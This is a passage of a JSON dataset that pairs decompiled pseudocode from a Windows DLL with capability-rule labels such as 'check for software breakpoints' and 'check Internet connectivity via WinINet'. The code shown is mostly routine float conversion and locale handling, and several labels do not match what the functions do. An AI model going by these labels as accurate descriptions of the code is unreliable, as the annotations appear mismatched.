4);\n        }\n        iVar17 = iVar12;\n        if (iVar4 != 0) {\n            iVar17 = uVar11 - 0x3ffe;\n        }\n        if (iVar17 < *0x180069144 - str.5_v_[0]) {\n            auStack88[0] = 0;\n            auStack88[1] = 0;\n            uVar15 = 2;\n            iVar4 = 0;\n        }\n        else if (*0x180069144 < iVar17) {\n            uVar11 = str.5_v_[1] >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + uVar11;\n            iVar12 = iVar4 >> 5;\n            uVar7 = iVar4;\n            cVar2 = uVar11;\n            if (iVar17 < *0x180069140) {\n                auStack88[0] = auStack88[0] & 0x7fffffff;\n                iVar4 = str.5_v_[3] + iVar17;\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                uVar5 = uVar15;\n                uVar10 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar5];\n                    auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar10;\n                    uVar5 = uVar5 + 1;\n                    uVar10 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar5 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n            }\n            else {\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                auStack88[0] = 0x80000000;\n                auStack88[1] = 0;\n                auStack88[2] = 0;\n                uVar5 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar15];\n                    auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                    uVar15 = uVar15 + 1;\n                    uVar5 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar15 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n                iVar4 = str.5_v_[3] + *0x180069140;\n                uVar15 = uVar10;\n            }\n        }\n        else {\n            auStack88[0] = uStack72;\n            auStack88[1] = uStack68;\n            auStack88[2] = iStack64;\n            uVar11 = *0x180069144 - iVar12 >> 0x1f & 0x1f;\n            iVar4 = (*0x180069144 - iVar12) + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            uVar16 = uVar15;\n            do {\n                uVar11 = auStack88[uVar5];\n                auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar16;\n                uVar5 = uVar5 + 1;\n                uVar16 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar5 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            uVar3 = str.5_v_[0] >> 0x1f & 0x1f;\n            uVar11 = str.5_v_[0] + uVar3;\n            iVar4 = uVar11 >> 5;\n            uVar11 = 0x1f - ((uVar11 & 0x1f) - uVar3);\n            uVar7 = uVar11;\n            if ((auStack88[iVar4] >> (uVar11 & 0x1f) & 1) != 0) {\n                if ((auStack88[iVar4] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                    for (iVar6 = iVar4 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                        if (auStack88[iVar6] != 0) goto code_r0x0001800435b2;\n                    }\n                }\n                else {\ncode_r0x0001800435b2:\n                    uVar11 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                    iVar12 = str.5_v_[0] + L'\\xffffffff' + uVar11;\n                    iVar17 = iVar12 >> 5;\n                    uVar3 = 1 << (0x1f - ((iVar12 & 0x1f) - uVar11) & 0x1f);\n                    uVar11 = auStack88[iVar17] + uVar3;\n                    if ((uVar11 < auStack88[iVar17]) || (uVar5 = uVar15,  uVar11 < uVar3)) {\n                        uVar5 = uVar10;\n                    }\n                    auStack88[iVar17] = uVar11;\n                    iVar6 = iVar17 + -1;\n                    while ((-1 < iVar6 && (uVar5 != 0))) {\n                        uVar11 = auStack88[iVar6] + 1;\n                        if ((uVar11 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar11 == 0)) {\n                            uVar5 = uVar10;\n                        }\n                        auStack88[iVar6] = uVar11;\n                        iVar6 = iVar6 + -1;\n                    }\n                }\n            }\n            auStack88[iVar4] = auStack88[iVar4] & -1 << (uVar7 & 0x1f);\n            iVar6 = iVar4 + 1;\n            if (iVar6 < 3) {\n                fcn.180033c90(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n            }\n            uVar11 = str.5_v_[1] + L'\\x01' >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + L'\\x01' + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            do {\n                uVar11 = auStack88[uVar15];\n                auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                uVar15 = uVar15 + 1;\n                uVar5 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar15 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            iVar4 = 0;\n            uVar15 = 2;\n        }\n    }\n    auStack88[0] = iVar4 << (0x1fU - str.5_v_[1] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | auStack88[0];\n    if (str.5_v_[2] == L'@') {\n        arg2[1] = auStack88[0];\n        *arg2 = auStack88[1];\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg2 = auStack88[0];\n    }\n    return uVar15;\n}\n",
        "token_count": 3193
    },
    "1800438b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.1800438bc(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int32_t iVar17;\n    uint32_t auStack88 [4];\n    uint32_t uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    \n    uVar1 = arg1[5];\n    uVar15 = 0;\n    uVar10 = 1;\n    uVar11 = uVar1 & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    auStack88[0] = *(arg1 + 3);\n    auStack88[1] = *(arg1 + 1);\n    auStack88[2] = *arg1 << 0x10;\n    iVar4 = 0;\n    uVar5 = uVar15;\n    if (iVar12 == -0x3fff) {\n        do {\n            if (auStack88[uVar5] != 0) {\n                auStack88[0] = 0;\n                auStack88[1] = 0;\n                uVar15 = 2;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 3);\n    }\n    else {\n        uStack72 = *(arg1 + 3);\n        uStack68 = *(arg1 + 1);\n        iStack64 = *arg1 << 0x10;\n        uVar9 = *0x180069160 >> 0x1f & 0x1f;\n        uVar3 = *0x180069160 + uVar9;\n        iVar17 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar9);\n        uVar7 = uVar3;\n        if ((auStack88[iVar17] >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((auStack88[iVar17] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                for (iVar6 = iVar17 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                    if (auStack88[iVar6] != 0) goto code_r0x0001800439c9;\n                }\n            }\n            else {\ncode_r0x0001800439c9:\n                uVar3 = *0x180069160 + -1 >> 0x1f & 0x1f;\n                iVar4 = *0x180069160 + -1 + uVar3;\n                iVar13 = iVar4 >> 5;\n                uVar9 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = auStack88[iVar13] + uVar9;\n                if ((uVar3 < auStack88[iVar13]) || (uVar3 < uVar9)) {\n                    uVar5 = 1;\n                }\n                iVar4 = uVar5;\n                auStack88[iVar13] = uVar3;\n                iVar6 = iVar13 + -1;\n                while ((-1 < iVar6 && (iVar4 = uVar5,  iVar4 != 0))) {\n                    uVar3 = auStack88[iVar6] + 1;\n                    if ((uVar3 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar3 == 0)) {\n                        uVar5 = uVar10;\n                    }\n                    iVar4 = uVar5;\n                    auStack88[iVar6] = uVar3;\n                    iVar6 = iVar6 + -1;\n                }\n            }\n        }\n        auStack88[iVar17] = auStack88[iVar17] & -1 << (uVar7 & 0x1f);\n        iVar6 = iVar17 + 1;\n        if (iVar6 < 3) {\n            fcn.180033c90(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n        }\n        iVar17 = iVar12;\n        if (iVar4 != 0) {\n            iVar17 = uVar11 - 0x3ffe;\n        }\n        if (iVar17 < *0x18006915c - *0x180069160) {\n            auStack88[0] = 0;\n            auStack88[1] = 0;\n            uVar15 = 2;\n            iVar4 = 0;\n        }\n        else if (*0x18006915c < iVar17) {\n            uVar11 = *0x180069164 >> 0x1f & 0x1f;\n            iVar4 = *0x180069164 + uVar11;\n            iVar12 = iVar4 >> 5;\n            uVar7 = iVar4;\n            cVar2 = uVar11;\n            if (iVar17 < *0x180069158) {\n                auStack88[0] = auStack88[0] & 0x7fffffff;\n                iVar4 = *0x18006916c + iVar17;\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                uVar5 = uVar15;\n                uVar10 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar5];\n                    auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar10;\n                    uVar5 = uVar5 + 1;\n                    uVar10 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar5 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n            }\n            else {\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                auStack88[0] = 0x80000000;\n                auStack88[1] = 0;\n                auStack88[2] = 0;\n                uVar5 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar15];\n                    auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                    uVar15 = uVar15 + 1;\n                    uVar5 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar15 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n                iVar4 = *0x18006916c + *0x180069158;\n                uVar15 = uVar10;\n            }\n        }\n        else {\n            auStack88[0] = uStack72;\n            auStack88[1] = uStack68;\n            auStack88[2] = iStack64;\n            uVar11 = *0x18006915c - iVar12 >> 0x1f & 0x1f;\n            iVar4 = (*0x18006915c - iVar12) + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            uVar16 = uVar15;\n            do {\n                uVar11 = auStack88[uVar5];\n                auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar16;\n                uVar5 = uVar5 + 1;\n                uVar16 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar5 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            uVar3 = *0x180069160 >> 0x1f & 0x1f;\n            uVar11 = *0x180069160 + uVar3;\n            iVar4 = uVar11 >> 5;\n            uVar11 = 0x1f - ((uVar11 & 0x1f) - uVar3);\n            uVar7 = uVar11;\n            if ((auStack88[iVar4] >> (uVar11 & 0x1f) & 1) != 0) {\n                if ((auStack88[iVar4] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                    for (iVar6 = iVar4 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                        if (auStack88[iVar6] != 0) goto code_r0x000180043bb6;\n                    }\n                }\n                else {\ncode_r0x000180043bb6:\n                    uVar11 = *0x180069160 + -1 >> 0x1f & 0x1f;\n                    iVar12 = *0x180069160 + -1 + uVar11;\n                    iVar17 = iVar12 >> 5;\n                    uVar3 = 1 << (0x1f - ((iVar12 & 0x1f) - uVar11) & 0x1f);\n                    uVar11 = auStack88[iVar17] + uVar3;\n                    if ((uVar11 < auStack88[iVar17]) || (uVar5 = uVar15,  uVar11 < uVar3)) {\n                        uVar5 = uVar10;\n                    }\n                    auStack88[iVar17] = uVar11;\n                    iVar6 = iVar17 + -1;\n                    while ((-1 < iVar6 && (uVar5 != 0))) {\n                        uVar11 = auStack88[iVar6] + 1;\n                        if ((uVar11 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar11 == 0)) {\n                            uVar5 = uVar10;\n                        }\n                        auStack88[iVar6] = uVar11;\n                        iVar6 = iVar6 + -1;\n                    }\n                }\n            }\n            auStack88[iVar4] = auStack88[iVar4] & -1 << (uVar7 & 0x1f);\n            iVar6 = iVar4 + 1;\n            if (iVar6 < 3) {\n                fcn.180033c90(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n            }\n            uVar11 = *0x180069164 + 1 >> 0x1f & 0x1f;\n            iVar4 = *0x180069164 + 1 + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            do {\n                uVar11 = auStack88[uVar15];\n                auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                uVar15 = uVar15 + 1;\n                uVar5 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar15 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            iVar4 = 0;\n            uVar15 = 2;\n        }\n    }\n    auStack88[0] = iVar4 << (0x1fU - *0x180069164 & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | auStack88[0];\n    if (*0x180069168 == 0x40) {\n        arg2[1] = auStack88[0];\n        *arg2 = auStack88[1];\n    }\n    else if (*0x180069168 == 0x20) {\n        *arg2 = auStack88[0];\n    }\n    return uVar15;\n}\n",
        "token_count": 3166
    },
    "18004408": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180044080(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    uchar *puStack80;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    char cStack48;\n    uchar auStack40 [8];\n    uchar auStack32 [16];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180067ce0 ^ auStack136;\n    fcn.180033d7c(auStack72, arg3);\n    puStack80 = auStack72;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.180045644(auStack32, auStack40, arg2, 0);\n    iVar2 = fcn.1800432b8(auStack32, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180044164;\n        }\n        if (iVar2 != 2) goto code_r0x00018004414f;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180044164;\n        }\ncode_r0x00018004414f:\n        if (cStack48 != '\\0') {\n            *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n        }\n        goto code_r0x000180044164;\n    }\n    if (cStack48 != '\\0') {\n        *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n    }\ncode_r0x000180044164:\n    fcn.180032ea0(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 534
    },
    "18004418": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180044184(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    uchar *puStack80;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    char cStack48;\n    uchar auStack40 [8];\n    uchar auStack32 [16];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180067ce0 ^ auStack136;\n    fcn.180033d7c(auStack72, arg3);\n    puStack80 = auStack72;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.180045644(auStack32, auStack40, arg2, 0);\n    iVar2 = fcn.1800438bc(auStack32, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180044268;\n        }\n        if (iVar2 != 2) goto code_r0x000180044253;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180044268;\n        }\ncode_r0x000180044253:\n        if (cStack48 != '\\0') {\n            *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n        }\n        goto code_r0x000180044268;\n    }\n    if (cStack48 != '\\0') {\n        *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n    }\ncode_r0x000180044268:\n    fcn.180032ea0(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 531
    },
    "18004483": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180044834(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int64_t iStack24;\n    char cStack16;\n    \n    fcn.180033d7c(auStack40, 0);\n    if (arg3 == 0) {\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        return 0;\n    }\n    if (((arg1 == 0) || (arg2 == 0)) || (0x7fffffff < arg3)) {\n        puVar2 = fcn.180035b28();\n        *puVar2 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\ncode_r0x000180044793:\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        uVar3 = 0x7fffffff;\n    }\n    else {\n        if (*(iStack32 + 8) == 0) {\n            uVar3 = fcn.180047010(arg1, arg2, arg3, 0);\n        }\n        else {\n            iVar1 = fcn.180046f84(auStack40, *(iStack32 + 0xc), 0x1001, arg1);\n            if (iVar1 == 0) goto code_r0x000180044793;\n            uVar3 = iVar1 - 2;\n        }\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 443
    },
    "1800012b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1800012b8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (arg4 == -1) {\n        arg4._0_4_ = fcn.180033b84(arg3);\n        arg4._0_4_ = arg4 + 1;\n    }\n    iVar2 = fcn.180034220(arg1, arg2 * 2, arg3, arg4 * 2);\n    if (iVar2 != 0) {\n        if (iVar2 == 0xc) {\n            fcn.1800124cc();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (iVar2 != 0x50) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "18000e03": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18000e03c(ulong arg1, uint16_t *arg2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    code *pcVar5;\n    uint *puVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar auStack1320 [32];\n    uint16_t *puStack1288;\n    uchar *puStack1280;\n    uint16_t auStack1272 [4];\n    int64_t iStack1264;\n    int64_t iStack1256;\n    int32_t aiStack1248 [6];\n    uint uStack1224;\n    uint uStack1220;\n    uchar *puStack1216;\n    ulong uStack1192;\n    ulong uStack1176;\n    ulong uStack1168;\n    uchar auStack1160 [16];\n    uchar auStack1144 [520];\n    ushort uStack624;\n    ushort uStack622;\n    uchar auStack616 [560];\n    uint64_t uStack56;\n    \n    uStack1168 = 0xfffffffffffffffe;\n    uStack56 = *0x180067ce0 ^ auStack1320;\n    iVar12 = 0;\n    auStack1272[0] = 0;\n    iVar10 = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\");\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (pcVar5 == NULL) {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"ntdll.dll\");\n        if (iVar11 != 0) {\n            auStack1272[0] = 0;\n            puStack1288 = auStack1272;\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesW)(iVar11, 0x10, 1, 0x18000d7c0);\n            if (auStack1272[0] != 0) {\n                uVar9 = auStack1272[0] & 0x3ff;\n                aiStack1248[0] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack1272[0]);\n                aiStack1248[1] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n                iVar10 = 2;\n            }\n        }\n    }\n    else {\n        auStack1272[0] = (*pcVar5)();\n        uVar9 = auStack1272[0] & 0x3ff;\n        aiStack1248[0] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack1272[0]);\n        aiStack1248[1] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n        iVar10 = 2;\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, \"GetSystemDefaultUILanguage\");\n        if (pcVar5 != NULL) {\n            auStack1272[0] = (*pcVar5)();\n            uVar9 = auStack1272[0] & 0x3ff;\n            aiStack1248[2] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack1272[0]);\n            aiStack1248[3] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n            iVar10 = 4;\n        }\n    }\n    aiStack1248[iVar10] = 0x800;\n    uStack622 = 0;\n    uStack624 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0x180000000, auStack1144, 0x105);\n    if (iVar2 != 0) {\n        fcn.180033c90(&uStack1224, 0, 0x38);\n        uStack1224 = 0x38;\n        puStack1216 = auStack1144;\n        uStack1192 = 1000;\n        uStack1176 = 0x180000000;\n        uStack1220 = 0x88;\n        fcn.18000d7d8(&iStack1264, 0xffffffffffffffff);\n        if ((((*0x180069958 == NULL) || ((iStack1264 == -1 && (iStack1264 = (**0x180069958)(),  iStack1264 != -1)))) &&\n            (*0x180069968 != NULL)) && ((iStack1264 != -1 && (iStack1256 == 0)))) {\n            (**0x180069968)(iStack1264, &iStack1256);\n        }\n        iVar11 = iVar12;\n        if (iVar10 + 1 != 0) {\n            do {\n                if (aiStack1248[iVar11] == 0x800) {\n                    iVar2 = fcn.180035a14(auStack1160, 4, 0x18004e020);\n                    if (iVar2 != 0) {\n                        if (iVar2 == 0xc) {\n                            fcn.1800124cc();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                        if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                            fcn.180012514();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                        if (iVar2 != 0x50) {\n                            fcn.180012514();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                    }\ncode_r0x00018000e32d:\n                    puVar6 = fcn.180035b28();\n                    uVar1 = *puVar6;\n                    puVar6 = fcn.180035b28();\n                    *puVar6 = 0;\n                    puStack1280 = auStack1160;\n                    puStack1288 = arg2;\n                    uVar3 = fcn.180035abc(auStack616, 0x112, 0x111, arg1);\n                    piVar7 = fcn.180035b28();\n                    if (*piVar7 == 0) {\n                        puVar6 = fcn.180035b28();\n                        *puVar6 = uVar1;\ncode_r0x00018000e39a:\n                        iVar8 = iVar12;\n                        if ((uVar3 != 0xffffffff) && (uVar3 < 0x112)) {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n                        }\n                        if (iVar8 == 0) goto code_r0x00018000e3c2;\n                    }\n                    else {\n                        piVar7 = fcn.180035b28();\n                        if (*piVar7 == 0) goto code_r0x00018000e39a;\n                        if (*piVar7 != 0xc) {\n                            if ((*piVar7 == 0x16) || (*piVar7 == 0x22)) {\n                                fcn.180001214(0x80070057);\n                                pcVar5 = swi(3);\n                                (*pcVar5)();\n                                return;\n                            }\n                            if (*piVar7 != 0x50) {\n                                fcn.180001214(0x80004005);\n                                pcVar5 = swi(3);\n                                (*pcVar5)();\n                                return;\n                            }\n                            goto code_r0x00018000e39a;\n                        }\n                        fcn.180001214(0x8007000e);\n                    }\n                    if ((*0x180069960 != NULL) && (iStack1264 != -1)) {\n                        if ((*0x180069970 != NULL) && (iStack1256 != 0)) {\n                            iStack1256 = 0;\n                            (**0x180069970)(0);\n                        }\n                        (**0x180069960)(iStack1264);\n                    }\n                    goto code_r0x00018000e49b;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(aiStack1248[iVar11], 3);\n                if (iVar2 != 0) goto code_r0x00018000e32d;\ncode_r0x00018000e3c2:\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < iVar10 + 1);\n        }\n        if ((*0x180069960 != NULL) && (iStack1264 != -1)) {\n            if ((*0x180069970 != NULL) && (iStack1256 != 0)) {\n                iStack1256 = 0;\n                (**0x180069970)(0);\n            }\n            (**0x180069960)(iStack1264);\n        }\n    }\ncode_r0x00018000e49b:\n    fcn.180032ea0(uStack56 ^ auStack1320);\n    return;\n}\n",
        "token_count": 2000
    },
    "1800288b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
